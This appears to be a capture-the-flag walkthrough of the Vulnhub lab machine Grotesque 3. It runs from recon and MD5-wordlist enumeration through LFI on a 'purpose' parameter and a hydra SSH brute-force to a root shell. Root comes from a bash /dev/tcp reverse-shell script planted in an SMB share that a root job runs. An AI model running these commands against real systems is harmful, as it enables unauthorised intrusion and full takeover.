# Grotesque 3| Vulnhub | Walkthrough

| Category          | Details               |
|----------         |---------              |
| Platform          | [Grotesque  3](https://www.vulnhub.com/entry/grotesque-301,723/)              |
| Difficulty        | Medium                  |
| Target machine    | Linux                 |
| Attacker Machine  | Kali linux            |
| Tools             |  nmap, gobuster, wfuzz, hydra, pspy64  |


# Reconnaissance
Begin by identifying the target machine's IP address on the local network.

[arp-scan](../Vulnhub/images/grotesque-3/image.png)

IP:- 10.0.2.21<br>
perform an Nmap scan to enumerate open ports and running services.

[Nmap Scan](../Vulnhub/images/grotesque-3/image-1.png)

nmap results show:
| Port      | Service       |
| --------- |---------------|
| 22/tcp    | ssh           |
| 80/tcp    | http          |

Browse to the web service running on port `80` to inspect the application.

[Webpage](../Vulnhub/images/grotesque-3/image-2.png)

# Enumeration
Initial directory enumeration with Gobuster does not reveal any interesting resources.

[Gobuster](../Vulnhub/images/grotesque-3/image-3.png)


Since the homepage references an image, inspect it for hidden clues

[image](../Vulnhub/images/grotesque-3/image-4.png)

[image_2](../Vulnhub/images/grotesque-3/image-5.png)

Similar to Grotesque 2, zooming into the image reveals the text `mdxxxxx`, suggesting that `MD5` hashing may play a role in the challenge.<br>
Generate an MD5-hashed version of the directory wordlist and use it as input for another round of Gobuster enumeration.
```
for i in $(cat /usr/share/wordlist/dirbuster-list-lowercase-2.3-medium.txt); do echo $i | md5sum >> md5.txt; done
```

[md5 hash wordlist](../Vulnhub/images/grotesque-3/image-6.png)

Run gobuster with the new wordlist

[gobuter](../Vulnhub/images/grotesque-3/image-7.png)

The scan identifies a PHP file. Although the page appears blank, its behavior suggests it may be vulnerable to Local File Inclusion (LFI).<br>
Use wfuzz to identify any hidden GET parameters accepted by the application.

[wfuzz](../Vulnhub/images/grotesque-3/image-8.png)

`wfuzz` discovers a parameter named `purpose`.<br>
Supplying `/etc/passwd` as the value of the `purpose` parameter successfully discloses the system's password file, confirming the LFI vulnerability.

[/etc/passwd](../Vulnhub/images/grotesque-3/image-9.png)

The exposed file reveals two notable accounts: `root` and `freddie`.<br>
Attempting to retrieve freddie's SSH private key through the LFI does not succeed.

[ssh key](../Vulnhub/images/grotesque-3/image-10.png)

Since the MD5 hint proved useful for directory discovery, apply the same approach to password guessing

# Exploitation
Use Hydra with the generated MD5 wordlist to perform an SSH password attack against the `freddie` account.
```
hydra -l freddie -P md5.txt  ssh://ip_address -t 4
```

[hydra](../Vulnhub/images/grotesque-3/image-11.png)

Hydra successfully recovers the SSH password for `freddie`.

# Initial Access

[ssh Login](../Vulnhub/images/grotesque-3/image-12.png)

The recovered credentials provide a successful SSH login as `freddie`, giving us an initial foothold on the system.

# Privilege escalation

Monitor scheduled tasks using pspy64 to identify potential privilege escalation opportunities.

[pspy64](../Vulnhub/images/grotesque-3/image-13.png)

pspy64 reveals that a root-owned process periodically interacts with an SMB share every one to two minutes.<br>
This behavior suggests that files placed in the SMB share may be executed by `root`, providing an opportunity to gain elevated privileges.

Enumerate the available SMB shares to identify the accessible share name.<br>
`smbclient -L 127.0.0.1`
[smbclient](../Vulnhub/images/grotesque-3/image-14.png)

Create a simple reverse shell script in `/tmp`
```
echo 'bash -i >& /dev/tcp/kali-ip/kali-port 0>&1' > /tmp/reverse.sh
```
[reverse shell file](../Vulnhub/images/grotesque-3/image-15.png)

Connect anonymously to the `grotesque` SMB share and upload the reverse shell script.

[smbclient_2](../Vulnhub/images/grotesque-3/image-16.png)

Start a Netcat listener on the attacker machine and wait for the scheduled task to execute the uploaded payload.<br>
Once the scheduled process runs, the reverse shell connects back as root, providing full administrative access.

[root access](../Vulnhub/images/grotesque-3/image-17.png)

[user flag](image-19.png)

[root flag](../Vulnhub/images/grotesque-3/image-18.png)

Root flag & User Flag found!<br>
I hope this walkthrough was clear, informative, and easy to follow.<br>

Happy Hacking ~!!!!